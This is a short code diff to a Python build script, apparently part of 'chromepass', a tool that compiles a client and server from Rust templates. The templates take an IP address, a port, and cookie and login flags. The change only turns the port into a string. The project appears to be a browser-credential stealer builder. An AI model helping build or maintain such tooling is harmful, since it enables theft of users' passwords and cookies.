@@ -93,7 +93,7 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
         "<<ERROR_MESSAGE>>": error_message,
         "<<COOKIES_BOOL>>": stringify_bool(cookies),
         "<<LOGIN_BOOL>>": stringify_bool(login),
-        "<<PORT>>": port
+        "<<PORT>>": str(port)
     }
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
@@ -115,7 +115,7 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
     if nobuild:
         return True
     replacement_map = {
-        "<<PORT>>": port
+        "<<PORT>>": str(port)
     }
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_server}/src/main.rs"
